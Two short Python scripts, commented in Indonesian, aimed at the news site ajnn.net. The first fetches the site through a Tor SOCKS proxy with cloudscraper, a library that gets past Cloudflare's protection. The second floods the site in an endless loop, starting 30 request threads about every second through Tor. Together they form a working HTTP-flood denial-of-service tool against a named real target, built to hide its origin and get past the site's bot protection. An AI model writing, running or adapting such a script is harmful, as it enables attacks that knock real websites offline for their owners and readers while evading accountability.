import cloudscraper

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

scraper = cloudscraper.create_scraper()

try:
    response = scraper.get("https://ajnn.net", proxies=proxies, timeout=15)
    print(f"Status code: {response.status_code}")
    print(response.text[:500])  # tampilkan 500 karakter pertama halaman
except Exception as e:
    print("Error:", e)
import cloudscraper
import threading
import time

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

scraper = cloudscraper.create_scraper()

url = "https://ajnn.net"

def fetch(index):
    try:
        resp = scraper.get(url, proxies=proxies, timeout=15)
        print(f"[{index}] Status: {resp.status_code}")
    except Exception as e:
        print(f"[{index}] Error: {e}")

def main_loop():
    counter = 1
    while True:
        for i in range(30):
            threading.Thread(target=fetch, args=(counter,)).start()
            counter += 1
            time.sleep(1/30)  # sekitar 33 ms delay

if __name__ == "__main__":
    main_loop()
